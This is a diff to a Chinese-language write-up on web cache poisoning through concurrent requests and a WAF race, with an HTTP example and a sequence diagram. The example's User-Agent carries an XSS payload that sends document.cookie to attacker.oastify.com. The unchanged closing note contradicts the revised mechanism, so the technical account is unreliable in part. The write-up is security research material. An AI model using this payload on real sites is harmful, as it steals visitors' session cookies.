@@ -529,37 +529,44 @@ GET /script.js HTTP/1.1
 Host: target.com
 User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
 
-# 请求 2 — 同时发起，目标为首页
+# 请求 2 — 同时发起，目标为首页（两请求 UA 相同：均由 Burp Match & Replace 全局设置）
 GET / HTTP/1.1
 Host: target.com
-User-Agent: Mozilla/5.0 (legitimate)
+User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
 ```
 
-**竞争点**：请求 1 请求的是**真实的 `.js` 文件**（非路径混淆），由于 CDN 对 `.js` 等静态扩展名路径应用更弱的内容检查，恶意 UA 得以穿透 WAF。CDN 内部的并发路由竞态导致请求 1 触发的缓存行为**污染了请求 2 的缓存键分配**——带毒的主页 HTML 响应被错误地关联到 `/` 的缓存桶。结果：**首页被投毒**，所有后续访问 `/` 的用户获得包含 XSS payload 的页面。
+**竞争点**：两个请求**都携带恶意 UA**——Burp Match & Replace 将 UA 全局替换。请求 1 走 `.js` 路径，CDN 认为"静态资源不会反射请求头"，WAF 检查弱，恶意 UA 放行。请求 2 走 `/` 路径，本应受到强 WAF 检查——但由于与请求 1 **单包并发到达**，WAF 内部会话状态被请求 1 的"已放行"污染，请求 2 也被放行。主页 `/` 将恶意 UA **反射到 HTML 中** → 该含 XSS 的响应被缓存 → 所有后续访问 `/` 的用户命中缓存桶，收到投毒页面。
 
 ```mermaid
 sequenceDiagram
-    actor A as 攻击者
+    actor A as 攻击者 (Burp UA=恶意payload)
     participant CDN as CDN/WAF
     participant O as 源站 Origin
+    participant V as 受害者
 
+    Note over A: Burp Match & Replace<br/>全局替换 UA 为恶意 payload
     A->>CDN: 请求 1: GET /script.js<br/>UA: <script>恶意payload
-    A->>CDN: 请求 2: GET /<br/>UA: Mozilla/5.0 (正常)
-    Note over CDN: ⚡ 并发到达，内部路由竞态 ⚡
+    A->>CDN: 请求 2: GET /<br/>UA: <script>恶意payload
+    Note over CDN: ⚡ 单包并发 (Send group in parallel) ⚡
 
-    CDN->>CDN: 请求1 走 .js 路径<br/>WAF 检查: 弱<br/>(静态资源不放行反射头)
-    CDN->>CDN: 请求2 走 / 路径<br/>WAF 检查: 强<br/>(HTML 页面会反射头)
+    rect rgb(230, 255, 230)
+        Note over CDN: 请求1：走 .js 路径
+        CDN->>CDN: WAF 检查: 弱<br/>.js 是静态资源<br/>“不会反射请求头”<br/>→ 恶意 UA 放行 ✓
+        CDN->>O: 回源
+        O-->>CDN: 200 OK (正常 JS 内容)
+    end
 
-    CDN->>O: 请求1 回源 .js
-    O-->>CDN: 200 OK (正常 JS 文件)
-    CDN->>O: 请求2 回源 /
-    O-->>CDN: 200 OK (主页 HTML, 含反射恶意 UA)
+    rect rgb(255, 230, 230)
+        Note over CDN: 请求2：走 / 路径
+        CDN->>CDN: WAF 检查: 本应 强<br/>但 WAF 内部会话<br/>被请求1 的放行状态污染<br/>→ 恶意 UA 也被放行 ✗
+        CDN->>O: 回源 (带恶意 UA)
+        O-->>CDN: 200 OK (主页 HTML)<br/>含反射的恶意 UA → XSS
+    end
 
-    Note over CDN: 缓存槽位分配器出现交叉污染<br/>请求1 的弱检查上下文<br/>污染了请求2 的缓存桶 "/"
+    Note over CDN: 主页含 XSS 的响应<br/>被缓存到 缓存桶 "/"
 
-    Note over CDN: 缓存桶 "/" 存储了带毒的主页 HTML
-
-    Note over A,CDN: 后续所有访问 / 的用户 → 缓存命中 → XSS
+    V->>CDN: GET /
+    CDN-->>V: 缓存命中 → 含 XSS 的主页
 ```
 
 > **注意**：这不是 Web Cache Deception 的路径混淆——两个请求都是对真实路径的请求。攻击依赖的是 CDN 内部路由竞态使并发请求的缓存键发生交叉，而非后端对同一路径的不同解释。
